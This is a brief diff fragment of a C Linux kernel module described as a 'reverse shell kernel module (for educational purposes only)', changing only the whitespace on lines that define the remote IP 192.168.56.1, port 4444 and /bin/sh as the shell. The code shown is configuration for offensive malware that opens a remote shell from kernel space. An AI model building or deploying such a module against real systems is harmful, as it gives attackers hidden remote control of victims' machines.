@@ -12,8 +12,8 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("cocomelonc");
 MODULE_DESCRIPTION("reverse shell kernel module (for educational purposes only)");
 
-#define REMOTE_IP "192.168.56.1"   // replace with the target IP
-#define REMOTE_PORT 4444           // replace with the target port
+#define REMOTE_IP "192.168.56.1"  // replace with the target IP
+#define REMOTE_PORT 4444       // replace with the target port
 #define SHELL_CMD "/bin/sh"
 
 static struct socket *client_socket = NULL;
